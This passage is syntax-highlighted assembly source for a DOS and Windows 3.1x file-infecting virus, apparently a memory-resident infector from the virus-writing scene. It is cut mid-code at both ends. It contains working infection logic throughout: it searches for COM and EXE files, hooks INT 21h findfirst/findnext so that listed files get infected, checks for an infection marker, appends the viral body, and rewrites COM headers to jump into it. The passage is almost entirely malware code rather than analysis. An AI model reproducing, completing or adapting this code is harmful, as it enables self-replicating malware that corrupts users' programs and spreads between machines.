                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">                       </span><span class="sc1">; the original COM header</span><span class="sc0">
                </span><span class="sc6">movsd</span><span class="sc0">                               </span><span class="sc1">; and copy it (5 bytes)</span><span class="sc0">
                </span><span class="sc6">movsb</span><span class="sc0">                               </span><span class="sc1">; to its entrypoint</span><span class="sc0">
                </span><span class="sc6">retf</span><span class="sc0">                                </span><span class="sc1">; Jump to CS:IP</span><span class="sc0">

</span><span class="sc1">; ÍÍ¹ Windows 3.1x module ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">

</span><span class="sc5">newexe_entry</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pusha</span><span class="sc0">                               </span><span class="sc1">; Push our registers</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                       </span><span class="sc1">; And save segments</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">                      </span><span class="sc1">; Get a writable alias</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">                       </span><span class="sc1">; selector of CS in AX</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">31h</span><span class="sc0">                         </span><span class="sc1">; and move it to DS</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">file_or_mem</span><span class="sc4">],</span><span class="sc12">'F'</span><span class="sc0"> </span><span class="sc1">; Runtime infection</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4eh</span><span class="sc0">                        </span><span class="sc1">; Find first file</span><span class="sc0">
</span><span class="sc5">find_more_com</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                         </span><span class="sc1">; No special attribs</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">inf_counter</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">  </span><span class="sc1">; inf_counter = 0</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">com_wildcard</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Look for COM files</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">; to infect only in</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">other_search</span><span class="sc0">                </span><span class="sc1">; current directory</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2fh</span><span class="sc0">                      </span><span class="sc1">; Get DTA address in</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">; ES:BX and point to it</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1eh</span><span class="sc0">                      </span><span class="sc1">; BX+1eh -&gt; filename</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                       </span><span class="sc1">; ES:DX -&gt; filename</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">file_flag</span><span class="sc4">],</span><span class="sc12">'C'</span><span class="sc0"> </span><span class="sc1">; Switch the COM flag on</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">check_com</span><span class="sc0">                   </span><span class="sc1">; And jump for it!</span><span class="sc0">

</span><span class="sc5">other_search</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4eh</span><span class="sc0">                      </span><span class="sc1">; Now let's look for</span><span class="sc0">
</span><span class="sc5">find_more_exe</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                       </span><span class="sc1">; EXE files (only in the</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">exe_wildcard</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; current directory) as</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">; there are not more</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">restore_ne</span><span class="sc0">                  </span><span class="sc1">; COM files to infect</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2fh</span><span class="sc0">                      </span><span class="sc1">; Get DTA address in</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">; ES:BX and point to it</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1eh</span><span class="sc0">                      </span><span class="sc1">; BX+1eh -&gt; filename</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                       </span><span class="sc1">; ES:DX -&gt; filename</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">file_flag</span><span class="sc4">],</span><span class="sc12">'E'</span><span class="sc0"> </span><span class="sc1">; Switch the EXE flag on</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">check_exe</span><span class="sc0">                   </span><span class="sc1">; And jump for it!</span><span class="sc0">

</span><span class="sc5">restore_ne</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                       </span><span class="sc1">; Pop our segments and</span><span class="sc0">
                </span><span class="sc6">popa</span><span class="sc0">                                </span><span class="sc1">; reggs from the stack</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0eah</span><span class="sc0">                        </span><span class="sc1">; jmp xxxx:xxxx</span><span class="sc0">
</span><span class="sc5">newexe_ip</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                           </span><span class="sc1">; Original offset</span><span class="sc0">
</span><span class="sc5">newexe_cs</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0ffffh</span><span class="sc0">                      </span><span class="sc1">; Original segment</span><span class="sc0">

</span><span class="sc1">; ÍÍ¹ DOS memory resident module ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">

</span><span class="sc5">new_int_21h</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">':)'</span><span class="sc0">                     </span><span class="sc1">; Our residency check?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">more_checks</span><span class="sc0">                 </span><span class="sc1">; Nope, more checks...</span><span class="sc0">

                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc0">                          </span><span class="sc1">; Turn ":)" into ";)"</span><span class="sc0">
                </span><span class="sc6">iret</span><span class="sc0">                                </span><span class="sc1">; Interrupt return</span><span class="sc0">

</span><span class="sc5">more_checks</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4eh</span><span class="sc0">                      </span><span class="sc1">; Find first file?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">findfirst</span><span class="sc0">                   </span><span class="sc1">; Yes, it's our time!</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4fh</span><span class="sc0">                      </span><span class="sc1">; Find next file?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">findnext</span><span class="sc0">                    </span><span class="sc1">; Our time again! :)</span><span class="sc0">

</span><span class="sc5">return_to_int</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0eah</span><span class="sc0">                        </span><span class="sc1">; jmp xxxx:xxxx</span><span class="sc0">
</span><span class="sc5">old_int_21h</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">                         </span><span class="sc1">; Original int 21h</span><span class="sc0">

</span><span class="sc1">; ÄÄ´ Findfirst (4eh) service ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">findfirst</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">pusha</span><span class="sc0">                               </span><span class="sc1">; Push'em onto the stack</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                       </span><span class="sc1">; Push ES as well so we</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">                          </span><span class="sc1">; now change it to CS</span><span class="sc0">

                </span><span class="sc6">cld</span><span class="sc0">                                 </span><span class="sc1">; Clear direction flag</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                       </span><span class="sc1">; DS:DX/SI -&gt; filename</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">filename</span><span class="sc0">                 </span><span class="sc1">; ES:DI -&gt; name buffer</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">file_offset</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc1">; Filename offset</span><span class="sc0">

</span><span class="sc5">get_path</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">lodsb</span><span class="sc0">                               </span><span class="sc1">; Load a byte of path</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                       </span><span class="sc1">; The end of the path?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">no_more_path</span><span class="sc0">                </span><span class="sc1">; Jump if so to work...</span><span class="sc0">

                </span><span class="sc6">stosb</span><span class="sc0">                               </span><span class="sc1">; Store it in the buffer</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">':'</span><span class="sc0">                      </span><span class="sc1">; Possible end of path?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">update_offset</span><span class="sc0">               </span><span class="sc1">; Then update offset</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc13">'\'                      ; Possible end of path?
</span><span class="sc0">                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">get_path</span><span class="sc0">                    </span><span class="sc1">; Update filename offset</span><span class="sc0">

</span><span class="sc5">update_offset</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">file_offset</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc1">; New filename offset</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">get_path</span><span class="sc0">                    </span><span class="sc1">; Get more characters</span><span class="sc0">

</span><span class="sc5">no_more_path</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">                          </span><span class="sc1">; Restore ES from stack</span><span class="sc0">
                </span><span class="sc6">popa</span><span class="sc0">                                </span><span class="sc1">; And the other registers</span><span class="sc0">

</span><span class="sc1">; ÄÄ´ Findnext (4fh) service ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">findnext</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">pushf</span><span class="sc0">                               </span><span class="sc1">; Push flags in the stack</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old_int_21h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Call original int 21h</span><span class="sc0">

                </span><span class="sc6">pushf</span><span class="sc0">                               </span><span class="sc1">; Push flags again</span><span class="sc0">
                </span><span class="sc6">pusha</span><span class="sc0">                               </span><span class="sc1">; Now push registers</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                       </span><span class="sc1">; And now segments</span><span class="sc0">

</span><span class="sc5">lets_work</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">cld</span><span class="sc0">                                 </span><span class="sc1">; Clear direction flag</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2fh</span><span class="sc0">                      </span><span class="sc1">; Get Disk Transfer Area</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">; (DTA) in ES:BX</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">file_offset</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; DI -&gt; filename offset</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                       </span><span class="sc1">; Now point with DS:SI</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">1eh</span><span class="sc0">                      </span><span class="sc1">; to the name in DTA</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                       </span><span class="sc1">; New DS = old ES</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                       </span><span class="sc1">; New ES = old CS</span><span class="sc0">

</span><span class="sc5">get_name</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">lodsb</span><span class="sc0">                               </span><span class="sc1">; Load byte from DS:SI</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">                               </span><span class="sc1">; And store it in ES:DI</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'.'</span><span class="sc0">                      </span><span class="sc1">; Look for extension</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">not_a_dot</span><span class="sc0">                   </span><span class="sc1">; Have we reached it?</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">dot_xy</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">     </span><span class="sc1">; Then store its offset</span><span class="sc0">
</span><span class="sc5">not_a_dot</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                       </span><span class="sc1">; End of filename?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">get_name</span><span class="sc0">                    </span><span class="sc1">; Keep on getting it</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                          </span><span class="sc1">; Push CS and pop DS</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                          </span><span class="sc1">; so they're the same</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">filename</span><span class="sc0">                 </span><span class="sc1">; DS:DX -&gt; filename</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">dot_xy</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; DS:DI -&gt; extension</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">file_or_mem</span><span class="sc4">],</span><span class="sc12">'M'</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc12">'XE'</span><span class="sc0">       </span><span class="sc1">; Is it an EXE file?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">check_exe</span><span class="sc0">                   </span><span class="sc1">; Seems so...</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc12">'OC'</span><span class="sc0">       </span><span class="sc1">; Maybe a COM file?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">pop_and_leave</span><span class="sc0">               </span><span class="sc1">; If not, pop and leave</span><span class="sc0">

</span><span class="sc1">; ÄÄ´ COM files check routine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">check_com</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                       </span><span class="sc1">; DS = ES (to open files</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                          </span><span class="sc1">; in DS:DX and ES:DX)</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d02h</span><span class="sc0">                    </span><span class="sc1">; Open the file we've</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">; found in DS:DX (from</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                       </span><span class="sc1">; memory) or ES:DX (from</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                          </span><span class="sc1">; the runtime infection)</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">system_checks</span><span class="sc0">               </span><span class="sc1">; Do some checks in</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">                       </span><span class="sc1">; order to know if we</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">close_and_pop</span><span class="sc0">               </span><span class="sc1">; may infect the file</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">                      </span><span class="sc1">; Read its first five</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">                        </span><span class="sc1">; bytes to our buffer</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">old_com_header</span><span class="sc0">           </span><span class="sc1">; and check if the file</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">; is already infected</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">old_com_header</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc12">');'</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">close_and_pop</span><span class="sc0">               </span><span class="sc1">; File is infected</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">lseek_end</span><span class="sc0">                   </span><span class="sc1">; Now check its size</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc2">0fc17h</span><span class="sc4">-</span><span class="sc5">espo_file_size</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">; 65535-virus-1000</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">close_and_pop</span><span class="sc0">               </span><span class="sc1">; Is it is too large?</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc5">espo_file_size</span><span class="sc4">+</span><span class="sc2">3e8h</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; And now see if it's</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">close_and_pop</span><span class="sc0">               </span><span class="sc1">; too small (virus+1000)</span><span class="sc0">

</span><span class="sc1">; ÄÄ´ COM files infection routine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">infect_com</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">file_flag</span><span class="sc4">],</span><span class="sc12">'C'</span><span class="sc0"> </span><span class="sc1">; Set the COM flag in</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">inf_counter</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Increment the counter</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                          </span><span class="sc1">; AX -&gt; filesize</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                      </span><span class="sc1">; Append our code to</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">espo_file_size</span><span class="sc0">           </span><span class="sc1">; the file we're about</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">espo_start</span><span class="sc0">               </span><span class="sc1">; to infect, leaving</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">; out the data buffers</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                          </span><span class="sc1">; Filesize in AX</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                        </span><span class="sc1">; Calcul8 the new jmp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">new_com_header</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">; And write it</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">lseek_start</span><span class="sc0">                 </span><span class="sc1">; Lseek to the start</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                      </span><span class="sc1">; And now write our new</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">                        </span><span class="sc1">; header -0e9h,?,?,;)-</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">new_com_header</span><span class="sc0">           </span><span class="sc1">; which jumps straight</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">; to the viral code</span><span class="sc0">

</span><span class="sc5">close_and_pop</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">                      </span><span class="sc1">; Close the file we've</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">; just infected</span><span class="sc0">

</span><span class="sc5">pop_and_leave</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">file_or_mem</span><span class="sc4">],</span><span class="sc12">'M'</span><span class="sc0"> </span><span class="sc1">; Memory infection?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">memory_exit</span><span class="sc0">                 </span><span class="sc1">; Yes, jump back to it</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">inf_counter</span><span class="sc4">],</span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">; Have we reached the</span><span class="sc0">
